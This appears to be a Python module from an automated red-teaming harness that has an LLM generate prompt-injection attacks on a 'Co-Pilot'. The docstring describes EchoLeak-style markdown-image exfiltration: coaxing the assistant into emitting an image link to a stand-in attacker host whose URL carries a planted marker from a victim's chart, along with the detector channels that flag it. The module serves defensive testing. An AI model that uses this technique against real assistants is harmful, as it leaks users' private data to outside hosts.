"""§2.4 markdown-image exfil — EchoLeak shape.

Coerces the Co-Pilot to emit ``![](https://attacker/?ctx=…)`` whose URL
encodes the marker the platform planted in the victim's chart. The
deterministic check's ``url_base64_param`` / ``url_percent_encoded`` /
``markdown_image_url`` channels all flag this.
"""

from __future__ import annotations

from cats.agents.red_team.exfil.base import (
    ExfilProposal,
    build_proposal,
    fresh_marker,
    run_specialist_llm,
)
from cats.llm.client import LLMClient

TECHNIQUE = "markdown_image_exfil"
DEFAULT_CHANNEL = "markdown_image_url"


async def propose(*, llm: LLMClient) -> ExfilProposal:
    marker = fresh_marker()
    parsed, llm_result = await run_specialist_llm(llm=llm, technique=TECHNIQUE, marker=marker)
    return build_proposal(
        parsed=parsed,
        marker=marker,
        technique=TECHNIQUE,
        fallback_channel=DEFAULT_CHANNEL,
        llm_result=llm_result,
    )
